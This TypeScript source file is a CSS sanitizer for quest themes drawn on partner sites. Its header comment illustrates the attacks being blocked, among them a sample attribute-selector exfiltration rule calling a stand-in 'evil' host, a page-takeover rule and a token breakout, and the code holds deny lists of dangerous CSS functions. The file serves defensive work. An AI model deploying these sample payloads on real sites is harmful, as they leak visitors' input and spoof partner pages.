/**
 * Theme CSS safety (2026-11 audit).
 *
 * Quest themes are written by qaid project members and served by qaid's
 * server, and this embed draws them on partner sites. A theme may restyle the
 * quest card; it must not reach the partner page or its visitors. Three holes
 * this closes:
 *
 *  1. Exfiltration. `[value^="a"] { background: url(https://evil/?a) }` sends
 *     what a visitor picks to someone else's server, and any `url()` is a
 *     tracking pixel on every page view.
 *  2. Page takeover. `:host { position: fixed; inset: 0 }` covers the whole
 *     partner page with something that looks like it.
 *  3. Breakout. A token value of `red; } :host { ... ` ends the token block
 *     and starts rules of its own.
 *  4. Drawing outside the quest. `position: absolute` with a big size and a
 *     high z-index, negative margins, or a transform can paint over the
 *     partner's page (a fake sign-in form over their site, say) without any
 *     `fixed`. A blocklist of geometry would never be complete, so this one is
 *     closed by containment instead (see "CONTAINMENT" below).
 *
 * qaid.dev applies the SAME rules when a theme is saved; keep the two lists in
 * step. They are explicit on purpose, so both sides can be read side by side.
 *
 * TOKEN VALUES (theme `tokens`, and host `colors` / `fontFamily`) are dropped
 * unless they are a plain CSS value. A value is refused if it contains any of:
 *   - the characters  ;  {  }  <  >  \
 *   - the text  url(  image-set(  image(  cross-fade(  src(  expression(
 *     @import  /*  javascript:   (any case)
 *   - unbalanced quotes, parentheses or brackets
 * A token NAME must be a custom property: --[A-Za-z0-9_-]+
 *
 * THEME CSS (theme `css`) is parsed and rebuilt, so its braces always balance
 * and it cannot swallow the layers after it. While rebuilding, this is dropped:
 *   - comments, and every  -->  and every  <  followed by a letter, / ! or ?
 *     (so no  </style  <script  <!--  survives; `width < 600px` does)
 *   - every @import, @charset and @namespace rule
 *   - a declaration whose property is  behavior  or  -moz-binding
 *   - a declaration whose value has  url(  (except url(#id), a same-document
 *     SVG reference),  image-set(  -webkit-image-set(  image(  cross-fade(
 *     src(  expression(  or  javascript:
 *   - a declaration  position: fixed  or  position: sticky
 *   - every @scope rule (a prelude-less @scope's `:scope` is the shadow host)
 *   - in a rule whose selector names  :host  (also :host() and
 *     :host-context()), every declaration except a custom property (--x) and
 *     color, color-scheme, font, font-*, line-height, letter-spacing. Nested
 *     rules and at-rule blocks inside it that still mean the host (`&...`,
 *     `@media`) get the same treatment.
 * CSS escapes (\75 rl, u\72l) are decoded before any check, so an escaped
 * word is caught like a plain one.
 *
 * CONTAINMENT. The shadow host (the element the embed puts on the page) is
 * the quest's box, and the embed sets `contain: paint` on it as an inline
 * `!important` style (see `HOST_CONTAINMENT`). Paint containment clips
 * everything inside to the host's box and makes the host the containing
 * block for absolute AND fixed descendants, so no size, offset, margin,
 * transform or z-index in theme CSS can paint past it. It also starts a
 * stacking context (what `isolation: isolate` would add) and a new block
 * formatting context, so a child's negative margin can't collapse through.
 * The host gets no `position` from us: it would change the partner's
 * layout, and containment already gives the containing block.
 *
 * Why the host, not the root element inside the shadow root: theme CSS can
 * size and move any element inside the tree, so a box it can restyle can't
 * be the limit. It can reach the host only through `:host`, and an
 * `!important` declaration in a shadow tree beats the host's inline
 * `!important` (for important rules the inner context wins), so that is
 * why `:host` rules are cut down to the harmless properties above: no
 * contain, overflow, clip, size, margin, transform, outline or shadow (the
 * host's own outline and box-shadow are not clipped by its own containment).
 *
 * Modal mode (no `container`) covers the viewport on purpose: the partner
 * chose it. There the host is `position: fixed; inset: 0`, so containment
 * clips to the viewport, which changes nothing the modal does. Its backdrop
 * and dialog frame are positioned by the embed with inline `!important`
 * styles (`BACKDROP_LOCK`, `MODAL_LOCK`) so a theme can recolour them but
 * not move or resize them. Native `<select>` and date pickers are drawn by
 * the browser outside the page and are not affected by any of this.
 *
 * The host page's own `css` option is the partner's code and is not filtered.
 */

const TOKEN_NAME = /^--[A-Za-z0-9_-]+$/;
const TOKEN_BAD_CHARS = /[;{}<>\\]/;
const TOKEN_BAD_TEXT =
  /url\(|image-set\(|(?:^|[^a-z0-9-])image\(|cross-fade\(|(?:^|[^a-z0-9-])src\(|expression\(|@import|\/\*|javascript:/i;

/** Quotes, parentheses and brackets all close, in order. */
function balanced(value: string): boolean {
  const stack: string[] = [];
  let quote: string | null = null;
  for (const ch of value) {
    if (quote) {
      if (ch === quote) quote = null;
      continue;
    }
    if (ch === '"' || ch === "'") quote = ch;
    else if (ch === "(") stack.push(")");
    else if (ch === "[") stack.push("]");
    else if (ch === ")" || ch === "]") {
      if (stack.pop() !== ch) return false;
    }
  }
  return quote === null && stack.length === 0;
}

/** True when `value` is a plain CSS value safe to drop into a declaration. */
export function isSafeTokenValue(value: unknown): value is string {
  if (typeof value !== "string") return false;
  if (TOKEN_BAD_CHARS.test(value)) return false;
  if (TOKEN_BAD_TEXT.test(value.replace(/\s+/g, ""))) return false;
  return balanced(value);
}

export function isSafeTokenName(name: string): boolean {
  return TOKEN_NAME.test(name);
}

/** The theme's tokens as a `:where(.qaid-q-root) { ... }` block, unsafe ones dropped. */
export function tokensToCss(tokens: Record<string, unknown> | null | undefined): string {
  if (!tokens) return "";
  const body = Object.entries(tokens)
    .filter(([k, v]) => isSafeTokenName(k) && isSafeTokenValue(v) && v.trim() !== "")
    .map(([k, v]) => `  ${k}: ${(v as string).trim()};`)
    .join("\n");
  return body ? `:where(.qaid-q-root) {\n${body}\n}` : "";
}

// ---------------------------------------------------------------------------
// Theme CSS: parse into rules and declarations, rebuild what passes.
// ---------------------------------------------------------------------------

/** Decode CSS escapes (`\75` → `u`, `\:` → `:`) so a check sees the real word. */
function unescapeCss(s: string): string {
  return s.replace(/\\([0-9a-fA-F]{1,6})\s?|\\([^\n0-9a-fA-F])|\\\n/g, (_m, hex, ch) => {
    if (hex) {
      const cp = parseInt(hex, 16);
      return cp > 0 && cp <= 0x10ffff ? String.fromCodePoint(cp) : "�";
    }
    return ch ?? "";
  });
}

/** An at-rule's name, escapes included (`@\73 cope` is `@scope`). */
const AT_KEYWORD = /^@((?:[-\w]|\\[0-9a-fA-F]{1,6}\s?|\\[^\n0-9a-fA-F])+)/;
const DROPPED_AT_RULES = new Set(["import", "charset", "namespace", "scope"]);
const BAD_PROPERTIES = new Set(["behavior", "-moz-binding"]);
const BAD_VALUE =
  /image-set\(|(?:^|[^a-z0-9-])image\(|cross-fade\(|(?:^|[^a-z0-9-])src\(|expression\(|javascript:/;

function isSafeDeclaration(name: string, value: string): boolean {
  const prop = unescapeCss(name).trim().toLowerCase();
  const val = unescapeCss(value).toLowerCase().replace(/\s+/g, "");
  if (BAD_PROPERTIES.has(prop) || prop.endsWith("behavior")) return false;
  if (BAD_VALUE.test(val)) return false;
  // url(#id) points into the same document (an SVG filter or marker); every
  // other url() loads something from somewhere.
  for (const m of val.matchAll(/url\(\s*(['"]?)(.)/g)) {
    if (m[2] !== "#") return false;
  }
  if (prop === "position" && /^(fixed|sticky)/.test(val)) return false;
  return true;
}

/**
 * Scan from `i` to the first top-level `;`, `{` or `}` (outside strings and
 * parentheses). Returns the index of that character, or `css.length`.
 */
function scanTo(css: string, i: number): number {
  let depth = 0;
  let quote: string | null = null;
  for (; i < css.length; i++) {
    const ch = css[i];
    if (quote) {
      if (ch === "\\") i++;
      else if (ch === quote || ch === "\n") quote = null;
      continue;
    }
    if (ch === "\\") {
      i++;
      continue;
    }
    if (ch === '"' || ch === "'") quote = ch;
    else if (ch === "(" || ch === "[") depth++;
    else if ((ch === ")" || ch === "]") && depth > 0) depth--;
    else if (depth === 0 && (ch === ";" || ch === "{" || ch === "}")) return i;
  }
  return i;
}

/** A selector that can match the shadow host. */
function namesHost(selector: string): boolean {
  return /:host\b/.test(unescapeCss(selector).toLowerCase());
}

/**
 * What a `:host` rule may set: inherited text and colour properties and
 * custom properties. Nothing here sizes, moves, clips or paints the host.
 */
const HOST_SAFE_PROPERTY = /^(--[\w-]+|color|color-scheme|font|font-[a-z-]+|line-height|letter-spacing)$/;

function isSafeHostProperty(name: string): boolean {
  const prop = unescapeCss(name).trim();
  return prop.startsWith("--") ? HOST_SAFE_PROPERTY.test(prop) : HOST_SAFE_PROPERTY.test(prop.toLowerCase());
}

interface Parsed {
  out: string;
  end: number;
}

/**
 * Parse a list of items (rules at the top level; declarations and nested
 * rules inside a block) until a closing `}` or the end. `inBlock` decides
 * whether a `name: value;` item is a declaration; `onHost` says the
 * declarations here apply to the shadow host.
 */
function parseItems(css: string, start: number, inBlock: boolean, onHost = false): Parsed {
  const parts: string[] = [];
  // A statement: an at-rule ending in `;`, or (inside a block) a declaration.
  const statement = (head: string): void => {
    if (!head) return;
    const at = AT_KEYWORD.exec(head);
    if (at) {
      // Statement at-rules: only @layer (an ordering list) is kept; this is
      // where @import, @charset and @namespace go.
      if (unescapeCss(at[1]).toLowerCase() === "layer") parts.push(`${head};`);
      return;
    }
    if (!inBlock) return;
    const colon = head.indexOf(":");
    if (colon <= 0) return;
    const name = head.slice(0, colon);
    const value = head.slice(colon + 1);
    if (onHost && !isSafeHostProperty(name)) return;
    if (isSafeDeclaration(name, value)) parts.push(`  ${name.trim()}: ${value.trim()};`);
  };

  let i = start;
  while (i < css.length) {
    const stop = scanTo(css, i);
    const head = css.slice(i, stop).trim();
    const ch = css[stop];
    if (ch === "{") {
      const at = AT_KEYWORD.exec(head);
      // Does this block's content apply to the host? An at-rule block
      // (@media, @supports, @layer) keeps its parent's answer; a style rule
      // does if it names :host, or if it is nested in a host rule and uses
      // `&` (a nested rule without `&` is a descendant).
      const blockOnHost = at ? onHost : namesHost(head) || (onHost && head.includes("&"));
      const inner = parseItems(css, stop + 1, true, blockOnHost);
      i = inner.end;
      if (at && DROPPED_AT_RULES.has(unescapeCss(at[1]).toLowerCase())) continue;
      if (head) parts.push(`${head} {\n${inner.out}\n}`);
      continue;
    }
    // `;`, `}` or the end of input: whatever came before is a statement.
    statement(head);
    i = stop + 1;
    // `}` ends this block. At the top level a stray `}` is just skipped.
    if (ch === "}" && inBlock) return { out: parts.join("\n"), end: i };
  }
  return { out: parts.join("\n"), end: css.length };
}

/** Rebuild a theme's custom CSS with every unsafe part removed. */
export function sanitizeThemeCss(css: unknown): string {
  if (typeof css !== "string" || css.trim() === "") return "";
  let text = css.replace(/\/\*[\s\S]*?(?:\*\/|$)/g, " ");
  // Nothing in a rebuilt stylesheet may close or open an HTML context, even
  // where it is only text, in case it is ever serialised into markup.
  let prev: string;
  do {
    prev = text;
    // `<` before a letter, `/`, `!` or `?` opens a tag or comment in HTML;
    // CSS itself only uses `<` in media ranges (`width < 600px`).
    text = text.replace(/<(?=[A-Za-z/!?])|-->/g, " ");
  } while (text !== prev);
  return parseItems(text, 0, false).out.trim();
}

// ---------------------------------------------------------------------------
// Containment (see CONTAINMENT in the header)
// ---------------------------------------------------------------------------

/**
 * On the shadow host, in both modes: nothing inside paints more than 40px past
 * its box. The 40px (`overflow-clip-margin`, which `contain: paint` honours)
 * keeps a card's glow or drop shadow, as the neon and glass themes draw, from
 * being cut off; it is far too little to cover a partner's page. Browsers
 * without `overflow-clip-margin` (Safari) clip at the box itself.
 */
export const HOST_CONTAINMENT: Readonly<Record<string, string>> = {
  contain: "paint",
  "overflow-clip-margin": "40px",
};

/** Modal mode: the backdrop always covers the (viewport-sized) host exactly. */
export const BACKDROP_LOCK: Readonly<Record<string, string>> = {
  position: "fixed",
  inset: "0",
  width: "auto",
  height: "auto",
  margin: "0",
  transform: "none",
  translate: "none",
  scale: "none",
  rotate: "none",
};

/**
 * Modal mode: the dialog frame stays centred, at the width the partner asked
 * for (`modalWidth`, through --qaid-modal-width) and inside the viewport.
 */
export const MODAL_LOCK: Readonly<Record<string, string>> = {
  position: "fixed",
  top: "50%",
  left: "50%",
  right: "auto",
  bottom: "auto",
  margin: "0",
  transform: "translate(-50%, -50%)",
  translate: "none",
  scale: "none",
  rotate: "none",
  width: "var(--qaid-modal-width, 480px)",
  "max-width": "calc(100vw - 32px)",
  "max-height": "calc(100vh - 32px)",
};

/**
 * Set `styles` inline with `!important`. Theme CSS lives in the same shadow
 * tree as these elements, and there an inline `!important` declaration beats
 * any stylesheet one, so a theme can't undo them. (The host is in the
 * partner's tree; it is kept out of the theme's reach by the `:host` rule.)
 */
export function lockStyles(el: HTMLElement, styles: Readonly<Record<string, string>>): void {
  for (const [prop, value] of Object.entries(styles)) {
    el.style.setProperty(prop, value, "important");
  }
}

// ---------------------------------------------------------------------------
// Installing the stylesheet
// ---------------------------------------------------------------------------

/**
 * Put `css` into the shadow root. A constructed stylesheet is used where the
 * browser has them (no HTML parse at all, and it is not blocked by a
 * partner's `style-src` CSP); otherwise a `<style>` whose textContent is set.
 * The `<style>` carries `data-qaid-q-theme`; a sheet is remembered in a WeakMap.
 */
/** Each installed theme sheet, with the source text it was built from. */
const themeSheets = new WeakMap<CSSStyleSheet, string>();

export function installThemeCss(root: ShadowRoot, css: string): void {
  const canAdopt =
    typeof CSSStyleSheet === "function" &&
    typeof CSSStyleSheet.prototype.replaceSync === "function" &&
    Array.isArray((root as { adoptedStyleSheets?: unknown }).adoptedStyleSheets);
  if (canAdopt) {
    try {
      const sheet = new CSSStyleSheet();
      sheet.replaceSync(css);
      themeSheets.set(sheet, css);
      root.adoptedStyleSheets = [...root.adoptedStyleSheets, sheet];
      return;
    } catch {
      // fall through to a <style>
    }
  }
  const style = document.createElement("style");
  style.setAttribute("data-qaid-q-theme", "");
  style.textContent = css;
  root.appendChild(style);
}

/** The theme stylesheets this module installed in `root` (for tests and teardown). */
export function themeSheetsIn(root: ShadowRoot): CSSStyleSheet[] {
  const adopted = (root as { adoptedStyleSheets?: CSSStyleSheet[] }).adoptedStyleSheets ?? [];
  return adopted.filter((s) => themeSheets.has(s));
}

/** The theme CSS installed in `root` as text, or null when none was. */
export function themeCssText(root: ShadowRoot): string | null {
  const sheets = themeSheetsIn(root);
  if (sheets.length > 0) {
    return sheets.map((s) => themeSheets.get(s)).join("\n");
  }
  const style = root.querySelector("style[data-qaid-q-theme]");
  return style ? style.textContent : null;
}
